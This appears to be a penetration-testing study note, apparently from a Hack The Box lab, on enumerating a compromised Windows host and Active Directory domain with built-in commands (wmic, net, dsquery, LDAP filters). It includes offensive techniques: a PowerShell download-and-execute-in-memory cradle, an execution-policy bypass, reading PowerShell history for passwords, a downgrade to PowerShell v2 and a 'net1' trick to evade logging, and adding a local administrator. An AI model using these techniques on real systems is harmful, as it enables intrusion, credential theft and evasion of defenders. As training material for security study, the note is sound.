## Env Commands For Host & Network Recon
#### Basic Enumeration Commands
|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|
#### Basic Enumeration
![](Screenshot%202026-05-26%20at%2014.33.31.png)
#### Systeminfo
![](Screenshot%202026-05-26%20at%2014.34.44.png)
## Harnessing PowerShell
|**Cmd-Let**|**Description**|
|---|---|
|`Get-Module`|Lists available modules loaded for use.|
|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|
|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|`Get-ChildItem Env: \| ft Key,Value`|Return environment values such as key paths, users, computer information, etc.|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|
#### Quick Checks Using PowerShell

```powershell
PS C:\htb> Get-Module
```
![](Screenshot%202026-05-26%20at%2014.35.37.png)

```powershell
PS C:\htb> Get-ExecutionPolicy -List
```
![](Screenshot%202026-05-26%20at%2014.35.57.png)

```powershell
PS C:\htb> whoami 
nt authority\system 

PS C:\htb> Get-ChildItem Env: | ft key,value
```
![](Screenshot%202026-05-26%20at%2014.36.36.png)
#### Downgrade Powershell

```powershell
PS C:\htb> Get-host
```
![](Screenshot%202026-05-26%20at%2014.37.09.png)

```powershell
PS C:\htb> powershell.exe -version 2
```
![](Screenshot%202026-05-26%20at%2014.37.24.png)

```powershell
PS C:\htb> Get-host
```
![](Screenshot%202026-05-26%20at%2014.37.38.png)

```powershell
PS C:\htb> get-module
```
![](Screenshot%202026-05-26%20at%2014.37.51.png)
#### Examining the Powershell Event Log
![](Pasted%20image%2020260526143811.png)
#### Starting V2 Logs
![](Pasted%20image%2020260526143903.png)
### Checking Defenses
#### Firewall Checks

```powershell
PS C:\htb> netsh advfirewall show allprofiles
```
#### Windows Defender Check (from CMD.exe)

```cmd
C:\htb> sc query windefend
```
#### Get-MpComputerStatus

```powershell
PS C:\htb> Get-MpComputerStatus
```
## Am I Alone?
#### Using qwinsta

```powershell
PS C:\htb> qwinsta
```
## Network Information
|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show allprofiles`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|
#### Using arp -a
![](Screenshot%202026-05-26%20at%2014.40.21.png)
#### Viewing the Routing Table

```powershell
PS C:\htb> route print
```
## Windows Management Instrumentation (WMI)
#### Quick WMI checks
|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|
```powershell
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```
## Net Commands
#### Table of Useful Net Commands
|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|
#### Listing Domain Groups

```powershell
PS C:\htb> net group /domain
```
#### Information about a Domain User

```powershell
PS C:\htb> net user /domain wrouse
```
#### Net Commands Trick

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.
#### Running Net1 Command
![](Screenshot%202026-05-26%20at%2014.42.26.png)
## Dsquery
#### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.
#### User Search

```powershell
PS C:\htb> dsquery user
```
#### Computer Search

```powershell
PS C:\htb> dsquery computer
```
#### Wildcard Search

```powershell
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
#### Users With Specific Attributes Set (PASSWD_NOTREQD)

```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
#### Searching for Domain Controllers

```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
### LDAP Filtering Explained

`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object.
#### UAC Values
![](Screenshot%202026-05-26%20at%2014.44.37.png)
#### OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
